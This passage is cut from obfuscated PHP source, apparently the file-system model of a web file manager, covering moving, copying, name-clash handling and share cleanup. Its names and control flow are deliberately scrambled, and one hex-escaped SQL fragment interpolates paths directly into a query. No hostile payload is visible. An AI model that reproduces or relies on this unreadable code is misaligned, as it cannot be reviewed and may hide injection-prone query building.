($a²ŸßÂ¯¿…[$a“µ´í†º³[376]] != $a“µ´í†º³[377]) { $eñìö–ñ‰[$a“µ´í†º³[378]][] = $a²ŸßÂ¯¿…[$a“µ´í†º³[383]]; } } $this->saveAll($DßíÕ¡Ÿ‘¨); $this->saveAll($a«º¬™œô); goto dé½®„óŠÓ; C±¼íÂšë: $cõğèŸŒö« = array(); $Då½äÓˆ®° = array(); $this->_childrenListAll($F‰‹Š‹ÕË§, $cõğèŸŒö«); goto F›øÉ¾­î; a¹ŒÉ°ò¢™: $a“µ´í†º³ =& $_SERVER[İë¬“ÅÒÛ›]; $Dæ„Êš‹¼‚ = $this->sourceInfoCache($F‰‹Š‹ÕË§); $bĞÌğš…Ñ¥ = $this->sourceInfoCache($C¬³Šî»Õä); goto D”¬£çêÂ; Eğô¯ßÁÈ: $DÁ‘šÄç‡[$F‰‹Š‹ÕË§] = $eÎ·ÏŸ; $DßíÕ¡Ÿ‘¨ = array(); $a«º¬™œô = array(); goto c²”¨ŠÅ¿÷; e²Çàçó¬¢: $this->addAll($Då½äÓˆ®°); $D…ŒĞÈÒáë = $this->where(array($a“µ´í†º³[385] => $eÎ·ÏŸ))->select(); $DÁ‘šÄç‡ = $this->_childrenMakeRelation($cõğèŸŒö«, $D…ŒĞÈÒáë); goto Eğô¯ßÁÈ; A˜ÊÈ”Ï²Û: } private function _childrenMakeRelation($f±ŠãÑÅù, $CÔ©Õ÷™¨) { $d¥¯ìßçá¬ =& $_SERVER[İë¬“ÅÒÛ›]; $e¥ÁÒğ·¹¼ = array(); $B‡‚ˆË² = array(); foreach ($f±ŠãÑÅù as $e©‹¡Æ¨Û) { $AŠÜÓ±‘½ = $e©‹¡Æ¨Û[$d¥¯ìßçá¬[28]] . $d¥¯ìßçá¬[8] . $e©‹¡Æ¨Û[$d¥¯ìßçá¬[374]]; $e¥ÁÒğ·¹¼[$AŠÜÓ±‘½] = $e©‹¡Æ¨Û[$d¥¯ìßçá¬[375]]; } foreach ($CÔ©Õ÷™¨ as $e©‹¡Æ¨Û) { $AŠÜÓ±‘½ = $e©‹¡Æ¨Û[$d¥¯ìßçá¬[28]] . $d¥¯ìßçá¬[8] . $e©‹¡Æ¨Û[$d¥¯ìßçá¬[374]]; $E–Å¥‹àÉ× = $e¥ÁÒğ·¹¼[$AŠÜÓ±‘½]; $B‡‚ˆË²[$E–Å¥‹àÉ×] = $e©‹¡Æ¨Û[$d¥¯ìßçá¬[375]]; } return $B‡‚ˆË²; } private function _childrenMatch($D£éå……Ú, $cæì×ğœô, $b°¬¸‰Â‡Æ) { goto AŒ©¶Û…‰; AâÓŒñçôÌ: $Bí‰—™Ñ¸“ = $D£éå……Ú[$BÃÔ„ÌŒ¼•[count($BÃÔ„ÌŒ¼•) - 1]]; foreach ($BÃÔ„ÌŒ¼• as $c±´İ–œ¤Ã) { if (isset($D£éå……Ú[$c±´İ–œ¤Ã])) { $C×…¾çßã” .= $D£éå……Ú[$c±´İ–œ¤Ã] . $bß‡µÅä­¨[386]; } } $C×…¾çßã” = rtrim($C×…¾çßã”, $bß‡µÅä­¨[47]) . $bß‡µÅä­¨[47]; goto B°×Ô‘°Ä; B°×Ô‘°Ä: return array($bß‡µÅä­¨[385] => $Bí‰—™Ñ¸“, $bß‡µÅä­¨[374] => $C×…¾çßã”); goto eó×‚œáÑ; AŒ©¶Û…‰: $bß‡µÅä­¨ =& $_SERVER[İë¬“ÅÒÛ›]; $C×…¾çßã” = $b°¬¸‰Â‡Æ[$bß‡µÅä­¨[374]]; $BÃÔ„ÌŒ¼• = $this->parentLevelArray($cæì×ğœô[$bß‡µÅä­¨[374]]); goto AâÓŒñçôÌ; eó×‚œáÑ: } private function _makeItemData($DÛ¯†—µç, $b™øíô´¬Ø, $Aé–ŠÚ´Î) { $DÄª†Åè«„ =& $_SERVER[İë¬“ÅÒÛ›]; $F‡Æ¨Ãëƒ = array($DÄª†Åè«„[387] => $DÛ¯†—µç[$DÄª†Åè«„[376]], $DÄª†Åè«„[388] => $Aé–ŠÚ´Î, $DÄª†Åè«„[389] => $DÛ¯†—µç[$DÄª†Åè«„[390]], $DÄª†Åè«„[391] => $DÛ¯†—µç[$DÄª†Åè«„[383]], $DÄª†Åè«„[392] => $DÛ¯†—µç[$DÄª†Åè«„[78]], $DÄª†Åè«„[393] => $b™øíô´¬Ø[$DÄª†Åè«„[394]], $DÄª†Åè«„[395] => $b™øíô´¬Ø[$DÄª†Åè«„[396]], $DÄª†Åè«„[397] => USER_ID, $DÄª†Åè«„[398] => USER_ID, $DÄª†Åè«„[399] => $b™øíô´¬Ø[$DÄª†Åè«„[375]], $DÄª†Åè«„[400] => $b™øíô´¬Ø[$DÄª†Åè«„[374]] . $b™øíô´¬Ø[$DÄª†Åè«„[375]] . $DÄª†Åè«„[47], $DÄª†Åè«„[401] => 0); return $F‡Æ¨Ãëƒ; } private function _copyApplyMeta($eµââÒø­, &$b»ï°ŞÎˆ) { $EÜÁÈÈ™­ =& $_SERVER[İë¬“ÅÒÛ›]; $cö«‹¡Äéó = $eµââÒø­[$EÜÁÈÈ™­[375]]; $EŠÓğ«›± = $eµââÒø­[$EÜÁÈÈ™­[28]]; if (!isset($eµââÒø­[$EÜÁÈÈ™­[402]]) || !$eµââÒø­[$EÜÁÈÈ™­[402]] || $eµââÒø­[$EÜÁÈÈ™­[402]] == $EÜÁÈÈ™­[403]) { $b»ï°ŞÎˆ[$EÜÁÈÈ™­[380]][] = array($EÜÁÈÈ™­[375], $cö«‹¡Äéó, $EÜÁÈÈ™­[402], short_id($cö«‹¡Äéó)); } if (Input::check($EŠÓğ«›±, $EÜÁÈÈ™­[404])) { $b»ï°ŞÎˆ[$EÜÁÈÈ™­[379]][] = array($EÜÁÈÈ™­[375] => $cö«‹¡Äéó, $EÜÁÈÈ™­[88] => $EÜÁÈÈ™­[405], $EÜÁÈÈ™­[360] => str_replace($EÜÁÈÈ™­[50], $EÜÁÈÈ™­[33], Pinyin::encode($EŠÓğ«›±))); $b»ï°ŞÎˆ[$EÜÁÈÈ™­[379]][] = array($EÜÁÈÈ™­[375] => $cö«‹¡Äéó, $EÜÁÈÈ™­[88] => $EÜÁÈÈ™­[406], $EÜÁÈÈ™­[360] => Pinyin::encode($EŠÓğ«›±, $EÜÁÈÈ™­[407])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($B¼ôÔ„–ó) { goto cãëĞÏ«Ï; a•ïİÁçÈÎ: $aèìíé‡Ô = array($a¶‹œøé­ˆ[374] => array($a¶‹œøé­ˆ[409], $eƒñß°á [$a¶‹œøé­ˆ[374]] . $B¼ôÔ„–ó . $a¶‹œøé­ˆ[410]), $a¶‹œøé­ˆ[411] => 0); $dÛ¬è®­¬ = $this->field($dÊ†¼©ß¾ó)->where($aèìíé‡Ô)->select(); if (!$dÛ¬è®­¬) { return; } goto d·±ÚÕ‰ÇŒ; cãëĞÏ«Ï: $a¶‹œøé­ˆ =& $_SERVER[İë¬“ÅÒÛ›]; $eƒñß°á  = $this->sourceInfo($B¼ôÔ„–ó); $dÊ†¼©ß¾ó = $a¶‹œøé­ˆ[408]; goto a•ïİÁçÈÎ; d·±ÚÕ‰ÇŒ: $dÛ¬è®­¬ = array_to_keyvalue($dÛ¬è®­¬, $a¶‹œøé­ˆ[375]); foreach ($dÛ¬è®­¬ as $e¦ëÆå¤ÉË) { $DçÚ¦¢Ë¶ = $e¦ëÆå¤ÉË[$a¶‹œøé­ˆ[385]]; $B¼ôÔ„–ó = $e¦ëÆå¤ÉË[$a¶‹œøé­ˆ[375]]; if (!isset($this->_childrenListCache[$B¼ôÔ„–ó]) && $e¦ëÆå¤ÉË[$a¶‹œøé­ˆ[376]] == $a¶‹œøé­ˆ[377]) { $this->_childrenListCache[$B¼ôÔ„–ó] = array(); } if (!isset($this->_childrenListCache[$DçÚ¦¢Ë¶])) { $this->_childrenListCache[$DçÚ¦¢Ë¶] = array(); } $this->_childrenListCache[$DçÚ¦¢Ë¶][$B¼ôÔ„–ó] = $e¦ëÆå¤ÉË; $this->_childrenItemCache[$B¼ôÔ„–ó] = $e¦ëÆå¤ÉË; } goto eœ Ì³½´; eœ Ì³½´: } private function _childrenListAll($F×ô®ÆŠğ, &$CîéæÑÚ) { $DéîÆ§¬ƒ” =& $_SERVER[İë¬“ÅÒÛ›]; if (!isset($this->_childrenListCache[$F×ô®ÆŠğ])) { return; } $F‰Şî±Ä§ = $this->_childrenListCache[$F×ô®ÆŠğ]; foreach ($F‰Şî±Ä§ as $AÙåœ¿îæö => $bŸ£ˆß‘Ñö) { $CîéæÑÚ[$AÙåœ¿îæö] = $bŸ£ˆß‘Ñö; if ($bŸ£ˆß‘Ñö[$DéîÆ§¬ƒ”[376]] == $DéîÆ§¬ƒ”[377]) { $this->_childrenListAll($AÙåœ¿îæö, $CîéæÑÚ); } } } private function sourceInfoCache($c¥›…™ã‡”) { if (isset($this->_childrenItemCache[$c¥›…™ã‡”])) { return $this->_childrenItemCache[$c¥›…™ã‡”]; } return $this->sourceInfo($c¥›…™ã‡”); } private function _childrenList($FˆŞ³í™‘¹) { if (isset($this->_childrenListCache[$FˆŞ³í™‘¹])) { return $this->_childrenListCache[$FˆŞ³í™‘¹]; } return $this->_childrenListSelect($FˆŞ³í™‘¹); } private function _childrenListSelect($CÛåë„‹) { goto c…÷¯éò‹; c¶ƒâÁ¸‰Ÿ: $cà¨§ÖùÉ† = $cà¨§ÖùÉ† ? $cà¨§ÖùÉ† : array(); $fùÄé†† = array_to_keyvalue($cà¨§ÖùÉ†, $D‘†ö‰‰[375]); $this->_childrenListCache[$CÛåë„‹] = $fùÄé††; goto e ÎÈ¸¼Ë“; e ÎÈ¸¼Ë“: foreach ($fùÄé†† as $CÛåë„‹ => $Dè–›™Á”) { $this->_childrenItemCache[$CÛåë„‹] = $Dè–›™Á”; } return $fùÄé††; goto BÄ³ÀŸššà; c…÷¯éò‹: $D‘†ö‰‰ =& $_SERVER[İë¬“ÅÒÛ›]; $fˆİğ¯×Ø = array($D‘†ö‰‰[385] => $CÛåë„‹, $D‘†ö‰‰[411] => 0); $cà¨§ÖùÉ† = $this->where($fˆİğ¯×Ø)->select(); goto c¶ƒâÁ¸‰Ÿ; BÄ³ÀŸššà: } private function fileNameExistCache($fù‹ğ†“Ï¾, $f‚‘´“Ê¤ï) { $e‡®µÀ“ë =& $_SERVER[İë¬“ÅÒÛ›]; $f‚‘´“Ê¤ï = strtolower($f‚‘´“Ê¤ï); $Eœë¾Èêä = $this->_childrenList($fù‹ğ†“Ï¾); foreach ($Eœë¾Èêä as $bà²§È±õÅ) { if ($f‚‘´“Ê¤ï == strtolower($bà²§È±õÅ[$e‡®µÀ“ë[28]])) { return $bà²§È±õÅ[$e‡®µÀ“ë[375]]; } } return !1; } private function fileNameAutoCache($C¥ê’…¸¹, $e¸ÊÂ“¥Ä§, $D¹îÖ‚ô¸, $a‡ÒÂå•¬Œ) { $DÄŠÔŞ…ê =& $_SERVER[İë¬“ÅÒÛ›]; $b§æª¥ÇŒ¾ = $this->_childrenList($C¥ê’…¸¹); $C§õ –Í‚• = array_to_keyvalue($b§æª¥ÇŒ¾, $DÄŠÔŞ…ê[33], $DÄŠÔŞ…ê[28]); return $this->fileNameAutoGet($C§õ –Í‚•, $e¸ÊÂ“¥Ä§, $D¹îÖ‚ô¸, $a‡ÒÂå•¬Œ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($fˆ¥áø™ù’, $CÂ‘Ô°¥›÷, $b¥‹…§‹¡ = REPEAT_REPLACE, $FöÜÖ‚ÉÕ = '') { goto CÍàŸ«çÈæ; aóºæÉÁ: if ($this->isParentOf($fˆ¥áø™ù’, $CÂ‘Ô°¥›÷)) { return !1; } if (!$aå¢Ÿ¡—º || !$bÜ«½„ÔÕ || $bÜ«½„ÔÕ[$f³Šœ¡æî¢[376]] != $f³Šœ¡æî¢[377]) { return !1; } if ($aå¢Ÿ¡—º[$f³Šœ¡æî¢[385]] == $CÂ‘Ô°¥›÷ && $FöÜÖ‚ÉÕ != $aå¢Ÿ¡—º[$f³Šœ¡æî¢[28]]) { $e ÜÈ¨í×Š = $this->fileNameExist($CÂ‘Ô°¥›÷, $FöÜÖ‚ÉÕ); if ($e ÜÈ¨í×Š && $aå¢Ÿ¡—º[$f³Šœ¡æî¢[376]] == $f³Šœ¡æî¢[403]) { $dòàâœÁå = $this->sourceInfo($e ÜÈ¨í×Š); $eÔ…é¼ªª = $this->fileHistory($dòàâœÁå, $aå¢Ÿ¡—º[$f³Šœ¡æî¢[383]], $aå¢Ÿ¡—º[$f³Šœ¡æî¢[78]]); if (!$eÔ…é¼ªª) { Model($f³Šœ¡æî¢[412])->remove($aå¢Ÿ¡—º[$f³Šœ¡æî¢[383]]); } $this->remove($fˆ¥áø™ù’, !1); $this->folderSizeReset($CÂ‘Ô°¥›÷); return $e ÜÈ¨í×Š; } } goto BêÚÏî«ª§; D¨ˆ‚­ƒ‚œ: $fêÍñŸ¬¢ö = $this->_move($fˆ¥áø™ù’, $CÂ‘Ô°¥›÷, $b¥‹…§‹¡, $Bª‘ãÈ§¸ó, $FöÜÖ‚ÉÕ); $this->sourceCacheClear(); if ($aå¢Ÿ¡—º[$f³Šœ¡æî¢[376]] == $f³Šœ¡æî¢[377] && $eùØ‰‚é˜‰) { $this->folderSizeResetChildren($fêÍñŸ¬¢ö); } goto c¹½®Ô©; c¹½®Ô©: Model($f³Šœ¡æî¢[164])->linkAdd($Bª‘ãÈ§¸ó[$f³Šœ¡æî¢[378]]); if ($eùØ‰‚é˜‰ && $Bª‘ãÈ§¸ó[$f³Šœ¡æî¢[413]]) { $this->remove($fˆ¥áø™ù’, !1); } $this->folderSizeReset($aå¢Ÿ¡—º[$f³Šœ¡æî¢[385]]); goto fØÎåÚ‡ëË; fØÎåÚ‡ëË: $this->folderSizeReset($CÂ‘Ô°¥›÷); $CÆƒ’‚ÈË = array($aå¢Ÿ¡—º[$f³Šœ¡æî¢[385]], $CÂ‘Ô°¥›÷); if ($aå¢Ÿ¡—º[$f³Šœ¡æî¢[376]] == $f³Šœ¡æî¢[377]) { $CÆƒ’‚ÈË[] = $fˆ¥áø™ù’; } goto AÀì“Åâ; BêÚÏî«ª§: $Bª‘ãÈ§¸ó = array($f³Šœ¡æî¢[378] => array(), $f³Šœ¡æî¢[413] => !1); $this->clearShare($fˆ¥áø™ù’, $CÂ‘Ô°¥›÷); $eùØ‰‚é˜‰ = $this->fileNameExistCache($CÂ‘Ô°¥›÷, $aå¢Ÿ¡—º[$f³Šœ¡æî¢[28]]); goto D¨ˆ‚­ƒ‚œ; AÀì“Åâ: $this->updateModifyTime($CÆƒ’‚ÈË); Model($f³Šœ¡æî¢[382])->eventMove($fˆ¥áø™ù’, $aå¢Ÿ¡—º[$f³Šœ¡æî¢[385]], $CÂ‘Ô°¥›÷); return $fêÍñŸ¬¢ö; goto dõï•Œ¸Ï½; CÍàŸ«çÈæ: $f³Šœ¡æî¢ =& $_SERVER[İë¬“ÅÒÛ›]; $aå¢Ÿ¡—º = $this->sourceInfo($fˆ¥áø™ù’); $bÜ«½„ÔÕ = $this->sourceInfo($CÂ‘Ô°¥›÷); goto aóºæÉÁ; dõï•Œ¸Ï½: } private function _move($a¶Íé†£´º, $A–Ş­‡Õ¶, $Cå×âÔßßğ, &$D¿îñ‚êÓ, $fäÇš¼ˆ Ã = '') { goto b³É¢·‰Ìè; e´ğâÀºİÃ: if ($C›ˆ‰ïŠ´ && !$D¿îñ‚êÓ[$B¼•À«¬‰[413]]) { $D¿îñ‚êÓ[$B¼•À«¬‰[413]] = !0; } return $d¤Ö«¢Èº½; goto Cáêë’£Ê·; eÎ“§Üõ–ó: $eç‚Õ–†× = $fäÇš¼ˆ Ã ? $fäÇš¼ˆ Ã : $FÉƒáö«‘å[$B¼•À«¬‰[28]]; $fÏ†Æ›¹„Ñ = $this->fileNameExistCache($A–Ş­‡Õ¶, $eç‚Õ–†×); if (!$fÏ†Æ›¹„Ñ) { return $this->_moveForce($a¶Íé†£´º, $A–Ş­‡Õ¶, $eç‚Õ–†×); } goto CÍàÍˆŠ‰è; b³É¢·‰Ìè: $B¼•À«¬‰ =& $_SERVER[İë¬“ÅÒÛ›]; $FÉƒáö«‘å = $this->sourceInfo($a¶Íé†£´º); $F÷–áØÌ = $FÉƒáö«‘å[$B¼•À«¬‰[376]] == $B¼•À«¬‰[377]; goto eÎ“§Üõ–ó; CÍàÍˆŠ‰è: $d¤Ö«¢Èº½ = $fÏ†Æ›¹„Ñ; $C›ˆ‰ïŠ´ = !1; if ($F÷–áØÌ) { if ($Cå×âÔßßğ == REPEAT_RENAME_FOLDER) { $eç‚Õ–†× = $this->fileNameAuto($A–Ş­‡Õ¶, $eç‚Õ–†×, $Cå×âÔßßğ, $F÷–áØÌ); $d¤Ö«¢Èº½ = $this->_moveForce($a¶Íé†£´º, $A–Ş­‡Õ¶, $eç‚Õ–†×); } else { if ($Cå×âÔßßğ == REPEAT_RENAME_FOLDER) { $Cå×âÔßßğ = REPEAT_RENAME; } $C¡¢‹³Š¾ = $this->_childrenListSelect($a¶Íé†£´º); foreach ($C¡¢‹³Š¾ as $Bô²°¥ñœ) { $this->_move($Bô²°¥ñœ[$B¼•À«¬‰[375]], $fÏ†Æ›¹„Ñ, $Cå×âÔßßğ, $D¿îñ‚êÓ); } $C›ˆ‰ïŠ´ = !0; } } else { if ($Cå×âÔßßğ == REPEAT_SKIP) { $C›ˆ‰ïŠ´ = !0; } else { if ($Cå×âÔßßğ == REPEAT_RENAME || $Cå×âÔßßğ == REPEAT_RENAME_FOLDER) { $eç‚Õ–†× = $this->fileNameAuto($A–Ş­‡Õ¶, $eç‚Õ–†×, $Cå×âÔßßğ, $F÷–áØÌ); $d¤Ö«¢Èº½ = $this->_moveForce($a¶Íé†£´º, $A–Ş­‡Õ¶, $eç‚Õ–†×); } else { if ($Cå×âÔßßğ == REPEAT_REPLACE) { $F–„³ğŒ®µ = $this->sourceInfoCache($fÏ†Æ›¹„Ñ); $BĞ‹àØğŠ = $this->fileHistory($F–„³ğŒ®µ, $FÉƒáö«‘å[$B¼•À«¬‰[383]], $FÉƒáö«‘å[$B¼•À«¬‰[78]]); if ($BĞ‹àØğŠ) { $D¿îñ‚êÓ[$B¼•À«¬‰[378]][] = $FÉƒáö«‘å[$B¼•À«¬‰[383]]; } else { $C›ˆ‰ïŠ´ = !0; } } } } } goto e´ğâÀºİÃ; Cáêë’£Ê·: } private function _moveForce($cô°Á •Øœ, $eÖ…ï™´‡Ù, $d¨óƒù“…) { goto F¡ªÌ÷‡Ş; F¸“š“‡é°: $BŸêÂÛô›† = $aÂ„Ä±‰´Ï[$FÕÇÉÏ’„…[376]] == $FÕÇÉÏ’„…[377]; $açò ì¢Šä = array($FÕÇÉÏ’„…[399] => $cöºÎ ‰•Î[$FÕÇÉÏ’„…[375]], $FÕÇÉÏ’„…[400] => $cöºÎ ‰•Î[$FÕÇÉÏ’„…[374]] . $cöºÎ ‰•Î[$FÕÇÉÏ’„…[375]] . $FÕÇÉÏ’„…[47], $FÕÇÉÏ’„…[393] => $cöºÎ ‰•Î[$FÕÇÉÏ’„…[394]], $FÕÇÉÏ’„…[395] => $cöºÎ ‰•Î[$FÕÇÉÏ’„…[396]], $FÕÇÉÏ’„…[398] => USER_ID, $FÕÇÉÏ’„…[401] => 0, $FÕÇÉÏ’„…[388] => $d¨óƒù“…); $d¨Õø´ÚäĞ = $aÂ„Ä±‰´Ï[$FÕÇÉÏ’„…[394]] == SourceModel::TYPE_GROUP && $cöºÎ ‰•Î[$FÕÇÉÏ’„…[394]] == SourceModel::TYPE_GROUP && $aÂ„Ä±‰´Ï[$FÕÇÉÏ’„…[396]] == $cöºÎ ‰•Î[$FÕÇÉÏ’„…[396]]; goto CÍ›Ö½’®‘; b§Îƒë±ì¦: return $cô°Á •Øœ; goto d‹•§áÓ®•; CÍ›Ö½’®‘: if (!$d¨Õø´ÚäĞ) { Model($FÕÇÉÏ’„…[414])->authClear($cô°Á •Øœ); } if ($BŸêÂÛô›†) { $D³Ò»Ã…ÏŒ = array($FÕÇÉÏ’„…[400] => array($FÕÇÉÏ’„…[409], $aÂ„Ä±‰´Ï[$FÕÇÉÏ’„…[374]] . $aÂ„Ä±‰´Ï[$FÕÇÉÏ’„…[375]] . $FÕÇÉÏ’„…[410])); $DÅî¦ŒÓñ = $aÂ„Ä±‰´Ï[$FÕÇÉÏ’„…[374]] . $aÂ„Ä±‰´Ï[$FÕÇÉÏ’„…[375]] . $FÕÇÉÏ’„…[47]; $F³Ñ³Ïœ¼³ = $cöºÎ ‰•Î[$FÕÇÉÏ’„…[374]] . $cöºÎ ‰•Î[$FÕÇÉÏ’„…[375]] . $FÕÇÉÏ’„…[47] . $aÂ„Ä±‰´Ï[$FÕÇÉÏ’„…[375]] . $FÕÇÉÏ’„…[47]; $B•®º›İç¾ = array($FÕÇÉÏ’„…[400] => array($FÕÇÉÏ’„…[415], "\x72\145\160\154\x61\143\145\x28\160\141\162\145\156\x74\x4c\145\x76\x65\154\54\47{$DÅî¦ŒÓñ}\x27\54\x27{$F³Ñ³Ïœ¼³}\47\x29"), $FÕÇÉÏ’„…[393] => $cöºÎ ‰•Î[$FÕÇÉÏ’„…[394]], $FÕÇÉÏ’„…[395] => $cöºÎ ‰•Î[$FÕÇÉÏ’„…[396]], $FÕÇÉÏ’„…[401] => 0); $this->where($D³Ò»Ã…ÏŒ)->data($B•®º›İç¾)->save(); } $this->where(array($FÕÇÉÏ’„…[416] => $cô°Á •Øœ))->data($açò ì¢Šä)->save(); goto b§Îƒë±ì¦; F¡ªÌ÷‡Ş: $FÕÇÉÏ’„… =& $_SERVER[İë¬“ÅÒÛ›]; $aÂ„Ä±‰´Ï = $this->sourceInfo($cô°Á •Øœ); $cöºÎ ‰•Î = $this->sourceInfo($eÖ…ï™´‡Ù); goto F¸“š“‡é°; d‹•§áÓ®•: } private function clearShare($E¡‚“‹¾Œ½, $fë‚óÕ­ÁÅ) { goto còªŠñªÕ; còªŠñªÕ: $a¸éèµ¬ =& $_SERVER[İë¬“ÅÒÛ›]; $FèÉâò¨¤ = $this->sourceInfo($E¡‚“‹¾Œ½); $eÂ²î¶Ùğ = $this->sourceInfo($fë‚óÕ­ÁÅ); goto dÔ¦ÎÂçÑÛ; AĞÚîæÎˆ: if (!$Fôê´¦‘Ê‹) { return; } $Fôê´¦‘Ê‹ = array_to_keyvalue($Fôê´¦‘Ê‹, $a¸éèµ¬[33], $a¸éèµ¬[420]); $a‚Ò˜®Ú¶— = array($a¸éèµ¬[420] => array($a¸éèµ¬[7], $Fôê´¦‘Ê‹)); goto D×‚çøÛ³»; dÔ¦ÎÂçÑÛ: if ($FèÉâò¨¤[$a¸éèµ¬[396]] == $eÂ²î¶Ùğ[$a¸éèµ¬[396]] && $FèÉâò¨¤[$a¸éèµ¬[394]] == $a¸éèµ¬[417]) { return; } $a‚Ò˜®Ú¶— = array($a¸éèµ¬[374] => array($a¸éèµ¬[409], $FèÉâò¨¤[$a¸éèµ¬[374]] . $E¡‚“‹¾Œ½ . $a¸éèµ¬[410]), $a¸éèµ¬[411] => 0); $e‡“…©À· = $this->field($a¸éèµ¬[416])->where($a‚Ò˜®Ú¶—)->getField($a¸éèµ¬[375], !0); goto Cá¯ùìø‘¨; D×‚çøÛ³»: Model($a¸éèµ¬[419])->where($a‚Ò˜®Ú¶—)->save(array($a¸éèµ¬[418] => 0)); Model($a¸éèµ¬[421])->where($a‚Ò˜®Ú¶—)->delete(); goto aí–µ¡ŠÆä; Cá¯ùìø‘¨: if (!$e‡“…©À·) { return; } $a‚Ò˜®Ú¶— = array($a¸éèµ¬[375] => array($a¸éèµ¬[7], $e‡“…©À·), $a¸éèµ¬[418] => 1); $Fôê´¦‘Ê‹ = Model($a¸éèµ¬[419])->field($a¸éèµ¬[420])->where($a‚Ò˜®Ú¶—)->select(); goto AĞÚîæÎˆ; aí–µ¡ŠÆä: } public function copyFolderFromIO($DÓÃùîù, $fàŞ ÉŒ…Í, $cÂç”Ğ…î, $eŞ‚Àò¸¾, $dç´»Ö‰Ğ) { goto a¶¦Íë¿É; AÒ„£å¶Œà: Hook::trigger($BÑç”ÎÌõ[424]); if ($d¿ßŠâï¥) { $this->folderSizeResetChildren($d¿ßŠâï¥); } $this->_childrenListClear(); goto cß£à¾‘©×; a¶¦Íë¿É: $BÑç”ÎÌõ =& $_SERVER[İë¬“ÅÒÛ›]; $a–Ã¬…ô˜Ô = array($BÑç”ÎÌõ[379] => array(), $BÑç”ÎÌõ[380] => array(), $BÑç”ÎÌõ[378] => array(), $BÑç”ÎÌõ[422] => array()); $a´ˆÚ­ÌÁ = $DÓÃùîù->getPathName($DÓÃùîù->pathThis($fàŞ ÉŒ…Í)); goto aŠ”Ø¾ªÑË; Bß‰¾ÛÊÎ„: Model($BÑç”ÎÌõ[412])->linkAdd($a–Ã¬…ô˜Ô[$BÑç”ÎÌõ[378]]); Model($BÑç”ÎÌõ[412])->remove($a–Ã¬…ô˜Ô[$BÑç”ÎÌõ[422]]); $this->folderSizeReset($cÂç”Ğ…î); goto fÔØ„‰¤ôù; aŠ”Ø¾ªÑË: $dƒ®¤‚İ­Ø = $this->fileNameExist($cÂç”Ğ…î, $a´ˆÚ­ÌÁ); $d¿ßŠâï¥ = $this->mkdir($cÂç”Ğ…î, $a´ˆÚ­ÌÁ, $eŞ‚Àò¸¾); if (!$dƒ®¤‚İ­Ø || $eŞ‚Àò¸¾ == REPEAT_RENAME_FOLDER) { $eŞ‚Àò¸¾ = !1; } goto AªÌŠŠŸ›¯; fÔØ„‰¤ôù: $this->updateModifyTime($cÂç”Ğ…î); return $d¿ßŠâï¥; goto D·ƒñ¦æø; AªÌŠŠŸ›¯: if ($dƒ®¤‚İ­Ø) { $this->_childrenAllMake($dƒ®¤‚İ­Ø); } Hook::trigger($BÑç”ÎÌõ[423]); $this->_copyChildTo($DÓÃùîù, $fàŞ ÉŒ…Í, $d¿ßŠâï¥, $eŞ‚Àò¸¾, $a–Ã¬…ô˜Ô, $dç´»Ö‰Ğ); goto AÒ„£å¶Œà; cß£à¾‘©×: Model($BÑç”ÎÌõ[381])->addAll($a–Ã¬…ô˜Ô[$BÑç”ÎÌõ[379]], array(), !0); Model($BÑç”ÎÌõ[382])->eventCopy($d¿ßŠâï¥); $this->saveAll($a–Ã¬…ô˜Ô[$BÑç”ÎÌõ[380]]); goto Bß‰¾ÛÊÎ„; D·ƒñ¦æø: } private function _copyChildTo($BìÂöèƒ‡», $AÇ¬ÉÉÀ™œ, $DîÖì°¬ˆ, $E¤ÍˆÁÊÆ, &$BÂŞ£óô¡, $FÅó¬Êõºİ) { goto A˜Æ¤ì˜Òä; eçø¿‘‰„: foreach ($C¾ŸÚñ˜ÜÓ as &$CË”œ‰½òù) { goto C²©ÑÀÍŸ‹; C²©ÑÀÍŸ‹: if (isset($A÷™Ş¹Üê¤[$CË”œ‰½òù[$añØÙ‡«Îæ[28]]])) { $CË”œ‰½òù = $A÷™Ş¹Üê¤[$CË”œ‰½òù[$añØÙ‡«Îæ[28]]]; } $CË”œ‰½òù[$añØÙ‡«Îæ[376]] = $CË”œ‰½òù[$añØÙ‡«Îæ[29]] == $añØÙ‡«Îæ[77]; $CË”œ‰½òù[$añØÙ‡«Îæ[390]] = _get($CË”œ‰½òù, $añØÙ‡«Îæ[157], $añØÙ‡«Îæ[33]); goto E²ŞÕ“ñß ; e­¤Ë´óë: if ($E¤ÍˆÁÊÆ) { $FëØ˜ğÜšñ = $this->fileNameExistCache($DîÖì°¬ˆ, $CË”œ‰½òù[$añØÙ‡«Îæ[28]]); if ($FëØ˜ğÜšñ) { if ($CË”œ‰½òù[$añØÙ‡«Îæ[376]] || $E¤ÍˆÁÊÆ == REPEAT_SKIP) { continue; } if ($E¤ÍˆÁÊÆ == REPEAT_REPLACE) { $E‹”Šª˜¼¡ = $this->sourceInfoCache($FëØ˜ğÜšñ); $cí‘Ë‚ˆµ† = $this->fileHistory($E‹”Šª˜¼¡, $CË”œ‰½òù[$añØÙ‡«Îæ[383]], $CË”œ‰½òù[$añØÙ‡«Îæ[78]]); if ($cí‘Ë‚ˆµ†) { $BÂŞ£óô¡[$añØÙ‡«Îæ[378]][] = $CË”œ‰½òù[$añØÙ‡«Îæ[383]]; } continue; } else { if ($E¤ÍˆÁÊÆ == REPEAT_RENAME) { $CË”œ‰½òù[$añØÙ‡«Îæ[28]] = $this->fileNameAutoCache($DîÖì°¬ˆ, $CË”œ‰½òù[$añØÙ‡«Îæ[28]], $E¤ÍˆÁÊÆ, !1); } } } } if (!$CË”œ‰½òù[$añØÙ‡«Îæ[376]] && $CË”œ‰½òù[$añØÙ‡«Îæ[383]]) { $BÂŞ£óô¡[$añØÙ‡«Îæ[378]][] = $CË”œ‰½òù[$añØÙ‡«Îæ[383]]; } $E¯³’Í„­[] = $this->_makeItemData($CË”œ‰½òù, $E‘º‹æïÛÕ, $CË”œ‰½òù[$añØÙ‡«Îæ[28]]); goto aÕÚˆŸ²¹Ü; E²ŞÕ“ñß : $CË”œ‰½òù[$añØÙ‡«Îæ[78]] = _get($CË”œ‰½òù, $añØÙ‡«Îæ[78], 0); $CË”œ‰½òù[$añØÙ‡«Îæ[383]] = _get($CË”œ‰½òù, $añØÙ‡«Îæ[383], 0); if (!isset($CË”œ‰½òù[$añØÙ‡«Îæ[425]]) && $CË”œ‰½òù[$añØÙ‡«Îæ[383]]) { $BÂŞ£óô¡[$añØÙ‡«Îæ[422]][] = 